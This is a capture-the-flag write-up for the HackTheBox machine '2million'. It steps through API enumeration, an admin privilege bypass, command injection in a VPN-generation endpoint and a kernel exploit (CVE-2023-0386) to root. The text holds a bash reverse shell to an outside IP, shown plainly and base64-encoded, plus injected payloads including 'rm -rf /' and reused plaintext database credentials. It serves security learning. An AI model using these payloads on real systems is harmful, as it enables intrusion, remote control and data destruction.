1. Port discovery

```console
$ rustscan -a twomillion.htb -t 5000 -b 1000 -- -sV | tee rustscan.out
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Port 80 analysis

```console
$ curl -I http://twomillion.htb
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Thu, 26 Feb 2026 04:33:14 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://2million.htb/

$ cat /etc/hosts
10.129.229.66 twomillion.htb 2million.htb

$ curl -X GET -I http://2million.htb
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 26 Feb 2026 04:34:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=tdr8cjv16t0e8pvjv7qrllqs77; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

$ ffuf -u "http://2million.htb/FUZZ" -w ~/Desktop/wordlists/raft-large-words.txt -ac -c

login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 306ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 283ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 197ms]
...

$ curl -I -X GET http://2million.htb/register
HTTP/1.1 200 OK

$ curl -X GET http://2million.htb/invite
....
    <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>

$ curl -X GET http://2million.htb/js/inviteapi.min.js # javascript was embeded in http://2million.htb/invite see above command output
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

goto https://thanhle.io.vn/de4js/ -> deobfuscate javascript through eval

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

```console
$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate -s | jq .
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

$ echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to /api/v1/invite/generate

$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "V0lORlYtUEwyTVotQlk1RzMtMEVBSkM=",
    "format": "encoded"
  }
}

$ echo "V0lORlYtUEwyTVotQlk1RzMtMEVBSkM=" | base64 -d
WINFV-PL2MZ-BY5G3-0EAJC
```

- After signuping up with the token, there was nothing interesting in the webpage moving back to API

```console
$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1 -s | jq .
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/auth -s -X GET
{"message":false}[ble: EOF]

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -s -X POST

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -s -X POST -I
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Sat, 28 Feb 2026 16:48:20 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -I
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 28 Feb 2026 16:48:39 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT
{"status":"danger","message":"Invalid content type."}[ble: EOF]   

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json"
{"status":"danger","message":"Missing parameter: email"}[ble: EOF]                                                                                                                             

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{email: "z3nshell@mail.io"}'
{"status":"danger","message":"Missing parameter: email"}[ble: EOF]                                                                                                                             

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io"}'
{"status":"danger","message":"Missing parameter: is_admin"}[ble: EOF]                                                                                                                          

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": true}'
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}[ble: EOF]                                                                                                         

ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": 1}'
{"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]
```

RCE

```
$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": 1}'
{"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]

$ echo "bash -i >& /dev/tcp/10.10.15.138/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg==

$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -X POST -H "Content-Type: application/json" -d '{"username": "admin;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;"}'
```

# Backend code vulnerablities:

## 1. Auth Bypass

```php
<?php
class AdminController
{
    public function is_admin($router)
    {
        if (!isset($_SESSION) || !isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || !isset($_SESSION['username'])) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }

        $db = Database::getDatabase();

        $stmt = $db->query('SELECT is_admin FROM users WHERE username = ?', ['s' => [$_SESSION['username']]]);
        $user = $stmt->fetch_assoc();

        if ($user['is_admin'] == 1) {
            header('Content-Type: application/json');
            return json_encode(['message' => TRUE]);
        } else {
            header('Content-Type: application/json');
            return json_encode(['message' => FALSE]);
        }
    }

    public function update_settings($router) {
        $db = Database::getDatabase();

        $is_admin = $this->is_admin($router);
        if (!$is_admin) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }

        if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
            return json_encode([
                'status' => 'danger',
                'message' => 'Invalid content type.'
            ]);
            exit;
        }

        $body = file_get_contents('php://input');
        $json = json_decode($body);

        if (!isset($json->email)) {
            return json_encode([
                'status' => 'danger',
                'message' => 'Missing parameter: email'
            ]);
            exit;
        }

        if (!isset($json->is_admin)) {
            return json_encode([
                'status' => 'danger',
                'message' => 'Missing parameter: is_admin'
            ]);
            exit;
        }

        $email = $json->email;
        $is_admin = $json->is_admin;

        if ($is_admin !== 1 && $is_admin !== 0) {
            return json_encode([
                'status' => 'danger',
                'message' => 'Variable is_admin needs to be either 0 or 1.'
            ]);
            exit;
        }

        $stmt = $db->query('SELECT * FROM users WHERE email = ?', ['s' => [$email]]);
        $user = $stmt->fetch_assoc();

        if ($user) {
            $stmt = $db->query('UPDATE users SET is_admin = ? WHERE email = ?', ['s' => [$is_admin, $email]]);
        } else {
            return json_encode([
                'status' => 'danger',
                'message' => 'Email not found.'
            ]);
            exit;
        }

        if ($user['username'] == $_SESSION['username'] ) {
            $_SESSION['is_admin'] = $is_admin;
        }

        return json_encode(['id' => $user['id'], 'username' => $user['username'], 'is_admin' => $is_admin]);
    }
}
```

code to check is_admin:

```php
$is_admin = $this->is_admin($router);
if (!$is_admin) {
    return header("HTTP/1.1 401 Unauthorized");
}
```

However, `is_admin()` returns:

* `json_encode(['message' => TRUE])`
* `json_encode(['message' => FALSE])`
* OR sets a header and exits

That means it returns a **string**, not a boolean.

In PHP:

```php
if (!"{"message":false}") {
```

Any non-empty string evaluates to **true**.

So:

* Even if the user is NOT admin,
* `is_admin()` returns `"{"message":false}"`
* That is truthy
* `!$is_admin` becomes `false`
* Authorization check is bypassed

This allows non-admin users to call update_settings().

## 2. RCE

```php
<?php
class VPNController
{
    private function remove_special_chars($string) {
        $string = str_replace(' ', '-', $string);
        $string = preg_replace('/[^A-Za-z0-9\-]/', '', $string);

        return $string;
    }

    private function download_vpn($fileName) 
    {
        // Define the allowed directory
        $allowedDir = realpath('/var/www/html/VPN/user');
        // Remove any path info from filename (for security)
        $fileName = basename($fileName);
        // Join the allowed directory with the filename
        $filePath = $allowedDir . '/' . $fileName;
        // Resolve to an absolute path
        $realPath = realpath($filePath);

        // Check if the file is in the allowed directory
        if ($realPath === false || strpos($realPath, $allowedDir) !== 0) {
            // File is not in the allowed directory
            header("HTTP/1.0 404 Not Found");
            die;
        }

        // Check if the file exists and is readable
        if (file_exists($filePath) && is_readable($filePath)) {
            // Send headers to prompt download
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filePath));
            flush(); // Flush system output buffer
            readfile($filePath);
            exit;
        } else {
            header("HTTP/1.0 404 Not Found");
        }
    }

    public function generate_user_vpn($router) {
        if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }
        if (!isset($_SESSION['username']) || $_SESSION['username'] == null) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }

        $username = $this->remove_special_chars($_SESSION['username']);
        $fileName = $username . ".ovpn";

        if (file_exists("VPN/user/" . $fileName) && is_readable("VPN/user/" . $fileName)) {
            $this->download_vpn($fileName);
        } else {
            $this->regenerate_user_vpn($router);
        }
    }

    public function regenerate_user_vpn($router, $user = null) {
        if ($user != null) {
            exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);
        } else {
            if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
                return header("HTTP/1.1 401 Unauthorized");
                exit;
            }
            if (!isset($_SESSION['username']) || $_SESSION['username'] == null) {
                return header("HTTP/1.1 401 Unauthorized");
                exit;
            }

            $username = $this->remove_special_chars($_SESSION['username']);
            $fileName = $username. ".ovpn";

            exec("/bin/bash /var/www/html/VPN/gen.sh $username", $output, $return_var);

            $this->download_vpn($fileName);
        }
    }

    public function admin_vpn($router) {
        if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }
        if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== 1) {
            return header("HTTP/1.1 401 Unauthorized");
            exit;
        }
        if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
            return json_encode([
                'status' => 'danger',
                'message' => 'Invalid content type.'
            ]);
            exit;
        }

        $body = file_get_contents('php://input');
        $json = json_decode($body);

        if (!isset($json)) {
            return json_encode([
                'status' => 'danger',
                'message' => 'Missing parameter: username'
            ]);
            exit;
        }
        if (!$json->username) {
            return json_encode([
                'status' => 'danger',
                    'message' => 'Missing parameter: username'
            ]);
            exit;
        }
        $username = $json->username;

        $this->regenerate_user_vpn($router, $username);
        $output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");

        return is_array($output) ? implode("<br>", $output) : $output;
    }
}
```

In `admin_vpn()`:

```php
$username = $json->username;
$this->regenerate_user_vpn($router, $username);
```

No sanitization is applied to `$username`.
An attacker (admin or compromised admin account) can inject commands:

```json
{
  "username": "john; rm -rf /"
}
```

This becomes:

```bash
/bin/bash /var/www/html/VPN/gen.sh john; rm -rf /
```



<details>
  <summary>Why earlier payload didn't work</summary>
  When we send:

```json
{
  "username": "admin;bash -i >& /dev/tcp/10.10.15.138/9001 0>&1;"
}
```

The actual command becomes:

```bash
/bin/bash /var/www/html/VPN/gen.sh admin;bash -i >& /dev/tcp/10.10.15.138/9001 0>&1;
```

So now we need to understand how this is executed internally.

How PHP `exec()` Runs Commands: Internally, PHP executes something equivalent to:

```
/bin/sh -c "<your command>"
```

Even though you're calling `/bin/bash`, **the entire string is first parsed by `/bin/sh`**. now the payload

```
bash -i >& /dev/tcp/10.10.15.138/9001 0>&1
```

The operator:

```
>&
```

is **Bash-specific syntax**.

But `/bin/sh` on many systems (especially Debian/Ubuntu) is:

```
dash
```

And `dash` does NOT support:

```
>&
```

So when `/bin/sh -c` parses your injected command, it errors before Bash even runs it.

Result:

* Syntax error
* Reverse shell never executes

which is a **shell parsing issue**, not a filtering issue.

working payload:

```json
{
  "username": "admin;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;"
}
```

This becomes:

```bash
/bin/bash /var/www/html/VPN/gen.sh admin;
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;
```

Now look carefully:

There are **no special redirection operators in the injected command itself**.

The shell only sees:

```
echo <base64> | base64 -d | bash
```

That is fully POSIX-compliant and works in `/bin/sh`.

Then:

1. `echo` outputs base64
2. `base64 -d` decodes it
3. `bash` executes the decoded content
4. Now Bash interprets:

   ```
   bash -i >& /dev/tcp/10.10.15.138/9001 0>&1
   ```

   which works because it's now being parsed by **bash**, not `/bin/sh`.
</details>


3. Priv esc

To user

```console
$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

$ cat /etc/passwd | grep home
cat /etc/passwd | grep home
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash

$ sshpass -p 'SuperDuperPass123' admin@2million.htb

$ cat user.txt 
e32206b78xxxx
```

To Root:

```console
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

admin@2million:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.2 LTS
Release:	22.04
Codename:	jammy

# jammy up to 5.15.0-70.77 is vulnerable to CVE-2023-0386

$ ./fuse ./ovlcap/lower ./gc &
[1] 2655
root@2million:~/CVE-2023-0386# [+] len of gc: 0x3ee0
mkdir: File exists
fuse: failed to access mountpoint ./ovlcap/lower: Permission denied
fuse_mount: Permission denied
./exp
uid:0 gid:0
[+] mount success
ls: reading directory './ovlcap/merge': Permission denied
total 0
open: Permission denied
[+] exploit success!
sh: 1: ./ovlcap/upper/file: not found
[1]+  Exit 1                  ./fuse ./ovlcap/lower ./gc

$ sudo -s

# id
root
```

